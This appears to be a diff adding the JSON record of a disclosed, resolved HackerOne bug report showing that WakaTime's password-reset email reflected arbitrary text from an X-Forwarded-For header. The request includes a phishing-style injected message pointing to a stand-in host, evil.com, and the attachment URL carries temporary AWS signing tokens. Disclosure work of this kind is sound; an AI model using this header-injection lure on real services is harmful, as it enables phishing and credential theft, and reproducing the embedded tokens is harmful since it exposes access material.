@@ -1,0 +1,123 @@
+{
+  "id": 244677,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDQ2Nzc=",
+  "url": "https://hackerone.com/reports/244677",
+  "title": "Add arbitrary content to Password Reset Email",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-30T08:59:53.936Z",
+  "submitted_at": "2017-06-30T08:59:53.936Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "footstep",
+    "url": "/footstep",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/040/985/40da829a3798f18b2e1a5c4eeb47ad988b8ed35a_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21801,
+    "url": "https://hackerone.com/wakatime",
+    "handle": "wakatime",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6t1wy3jbq9kayjwvqbnymavxizfx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6t1wy3jbq9kayjwvqbnymavxizfx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WakaTime",
+      "twitter_handle": "wakatime",
+      "website": "https://wakatime.com",
+      "about": "Automated metrics about your programming from text editor plugins."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-07-20T15:36:20.840Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-07-20T08:37:39.476Z",
+  "team_member_agreed_on_going_public_at": "2017-07-20T15:36:20.784Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI noticed the inclusion of `IP Address` in the email sent for password reset. Then I tried including a new *header*, `X-Forwarded-For` to see if the IP Address in the email could change. Though it didn't change it but it did include whatever value that was injected in the header.\n\n###Request\n```\nPOST /api/v1/users/reset_password HTTP/1.1\nHost: wakatime.com\nX-Forwarded-For: _For precaution, send your email and new password to ███@email.com or visit www.evil.com.\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/json\nX-CSRFToken: [Token]\nX-Requested-With: XMLHttpRequest\nReferer: https://wakatime.com/reset_password?email=████@gmail.com\nContent-Length: 35\nCookie: [Cookie]\nConnection: close\n\n{\"email\":\"EmailAddress\"}\n```\n\nWhat is included in the request is \n> X-Forwarded-For: _For precaution, send your email and new password to ███████@email.com or visit www.evil.com.\n\nThen the reflection in email is shown below,\n{F209902}\n\nBest Regards,\nShuaib",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 209902,
+      "file_name": "h1uploadedattachment.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/209/902/3a44308bef3d5a659ade717f9af0a8b451252ff0/h1uploadedattachment.png?response-content-disposition=attachment%3B%20filename%3D%22h1uploadedattachment.png%22%3B%20filename%2A%3DUTF-8%27%27h1uploadedattachment.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DREO5IG%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T033623Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnneVoiheeVrYn06TOHU%2Fq2zgqOC8Sv%2BOKH%2FGAnshAIQIgAPAHqJZ7DjWF3X9HWktBOirApuw%2F19BKR3KmNLS6VgQquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBv%2BAORdmAf2qKtPgiqPBfdxFGQ4gh1bXu4t%2FwfazyZQBKebhdXFQjgNUe34tkbZp7l9aQIkk3VWFtfMyOlRK2oNwIrTg9J4Z%2BCt2N%2FvW0teeJli8qV0vL6ESaeQMlEGRk1WRO0VGr4Qm%2FLIaunnloSdG0lfCIhk1k0TaZAgkrXk9lZIExdoyaTVXMccsNbbWrtbxm8nygt7Gymot6aPm7Y4LoseFs5bzUHNGKkrQLW4PUETKdmhesy3fpKLnEbU4U%2BgvSpSDobTHI7i8q1O2Agsz%2FQ6CzzYW6L9L1JbCdpCABsdDQd5APZOGHGpYriaixGnInxfumF9pCNaq9CxkaK4dAN%2FsJCokmAOWSB8h0%2BDYSOT7UCnNrKNxSKlG0w6R28IL5gidAHNZp2PmCFAVmzz1uzVOX6ilobwTRoe4NgOYyCsIzvjJE6TIy724dBjGtCaxvrKSAFpcy4GYYglas2WUiGxouwm1p8qW6PUsylmixJ8fLdP9TYwGxbk529SnVz90zxdh694yXCbYZhzG8tl%2B3qD5e0%2B2UYl6vm43xclP7rNmGqm%2BTH0V0RjNpGK5Qb7eVpfncFdPI83k64pSZWRNB9JLvv9sUaGw2Hv9ppOCssA%2BpCaKzRhUBDm%2FSkAzi2K%2FHL9MEq7jYRSxbcD5IhaG0ICp3BV19tEyRYYNHGzyswUoKyl51kpKJSMrVOST4BiewjCEotNnSjWEdg7Jv3sBXGJNri2ypIv5%2BNx9SMbAYK6yewK4Iupt9AI%2B0qPD%2F6SyipUvMfjzZBP9haDbfjuJS5inj%2BDmRhXklnVfK4bqUdGo7LNs0k5cY9FrKlqh0H%2Fzt40AITSqW8SzQBHiVrWjEl38BWJe0ajrdqANQsvlH%2FiUIZ3KqzN0T7c9AowmOrjzAY6sQFduaBRItRS0p2ShadMPmvPjxVngd9AVFQNmslDCMNOSMGb%2F%2FR8SbjqnRtL7mkf7pTvwBcswAZUK2xu5IrpfCfZ98fxSJsaMWF8KqiFpmqDbuosWTTB38Rs0Hb4a2pKa1DMZUirIO5mzo6oTNIZvKbSdHMm2d0a0WPQhgZJlkfEB3AOZhnIzzJo%2FT3gKOZNgIc2I%2Bd6muGNebdM6Ly%2BhUnTqk9p9aKzPS6CclS6Ada8bxc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e5ba8205a4581a6fb1e9ee5b7dbdc9d3082b48696e65a01b6f8d034ac78b2226",
+      "file_size": 864216,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-08-19T08:37:39.536Z",
+  "allow_singular_disclosure_after": -268513123.9192076,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "jr0ch17",
+    "samux",
+    "bhavukjain1",
+    "bl4de",
+    "spam404",
+    "s_p_q_r",
+    "003random",
+    "pr0f0x01",
+    "akaash_pantherdefence",
+    "malcolmx",
+    "and 14 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
